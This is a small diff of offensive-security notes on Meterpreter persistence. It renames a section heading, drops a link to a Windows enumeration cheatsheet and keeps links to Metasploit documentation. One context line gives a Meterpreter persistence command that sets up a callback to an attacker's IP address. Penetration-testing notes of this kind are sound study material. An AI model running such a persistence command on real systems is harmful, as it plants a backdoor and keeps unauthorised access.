@@ -22,8 +22,7 @@
 * Using Meterpreter's persistence module (`> run persistence -U -i 20 -p 80 -r [IP address]`) is detectable by AV.
 * A combination of the two solves these problems.
 
-## Cheatsheets
+## Resources
 
-* [Windows post exploitation enumeration](cheatsheets:docs/enumeration/windows-post)
 * [Offensive security: Meterpreter Basic Commands](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/)
 * [Metasploit documentation](https://docs.metasploit.com/)
